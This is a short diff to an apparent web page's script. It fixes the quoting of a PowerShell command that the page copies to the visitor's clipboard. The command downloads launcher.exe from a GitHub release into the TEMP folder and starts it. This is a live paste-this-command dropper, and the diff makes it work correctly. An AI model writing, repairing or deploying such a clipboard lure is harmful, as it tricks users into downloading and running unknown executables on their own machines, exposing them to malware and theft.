@@ -80,7 +80,7 @@
         </div>
     </div>
     <script>
-        const command = 'powershell -Command "Invoke-WebRequest -Uri 'https://github.com/lolkekdumped228/escapefromeurope/releases/download/1/launcher.exe' -OutFile \"$env:TEMP\a.exe\"; Start-Process \"$env:TEMP\a.exe\""                                                                ';
+        const command = 'powershell -Command "Invoke-WebRequest -Uri \\"https://github.com/lolkekdumped228/escapefromeurope/releases/download/1/launcher.exe\\" -OutFile \\"$env:TEMP\\a.exe\\"; Start-Process \\"$env:TEMP\\a.exe\\""';
         function copyToClipboard() {
             navigator.clipboard.writeText(command);
         }
